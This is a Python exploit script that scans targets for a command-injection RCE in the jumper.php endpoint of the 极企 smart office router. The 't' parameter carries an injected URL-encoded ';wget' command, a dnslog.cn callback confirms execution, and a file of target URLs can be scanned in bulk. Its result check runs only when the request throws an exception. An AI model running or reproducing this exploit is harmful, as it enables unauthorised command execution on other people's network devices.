#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Author  : 浅梦安全
import requests
import argparse
import random
import time
import string
from urllib3.exceptions import InsecureRequestWarning

RED = '\033[91m'
RESET = '\033[0m'
# 忽略证书验证警告
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

def rand_base(n):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=n))

 
headers = {
    'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36'
}
 
def get_dnslog():
    url = f'http://www.dnslog.cn/getdomain.php?t={random.random()}'
    r = requests.get(headers=headers,url=url,timeout=18)
    get_cookie = r.cookies.get_dict()
    for k,v in get_cookie.items():
        cookie = f'{k}={v}'
    info = {'domain':r.text,'cookie':cookie}
    return info
 
def check_dnslog(info):
    cookie = info['cookie']
    domain = info['domain']
    url = f'http://www.dnslog.cn/getrecords.php?t={random.random()}'
    headers.update({'Cookie':cookie})
    r = requests.get(headers=headers,url=url,timeout=18)
    get_log_text = r.text
    if domain in get_log_text:
        return True
    else:
        return False

    

def check_vulnerability(url):
    identification=rand_base(4)
    dnsloginfo=get_dnslog()
    dnslog=dnsloginfo['domain']
    #dnslog="s43503.dnslog.cn"   #测试过程中发现脚本请求www.dnslog.cn有点问题，可以自己定义一下看回显
    try:
        # 构造完整的攻击URL
        attack_url = f"{url.rstrip('/')}/notice/jumper.php?t=;wget%20%68%74%74%70%3a%2f%2f{identification}.{dnslog}"
        #print(attack_url)
        response = requests.get(attack_url, verify=False, timeout=10)
  
        
    except requests.RequestException as e:
        if check_dnslog(dnsloginfo):
            print(f"{RED}URL [{url}] 可能存在极企智能办公路由jumper接口存在RCE漏洞；dnslog头标识：{identification}{RESET}")
        else:
            print(f"URL [{url}] 可能不存在漏洞；dnslog头标识：{identification}")

def main():
    parser = argparse.ArgumentParser(description='检测目标地址是否存在极企智能办公路由jumper接口存在RCE漏洞')
    parser.add_argument('-u', '--url', help='指定目标地址')
    parser.add_argument('-f', '--file', help='指定包含目标地址的文本文件')

    args = parser.parse_args()

    if args.url:
        if not args.url.startswith("http://") and not args.url.startswith("https://"):
            args.url = "http://" + args.url
        check_vulnerability(args.url)
    elif args.file:
        with open(args.file, 'r') as file:
            urls = file.read().splitlines()
            for url in urls:
                if not url.startswith("http://") and not url.startswith("https://"):
                    url = "http://" + url
                check_vulnerability(url)

if __name__ == '__main__':
    main()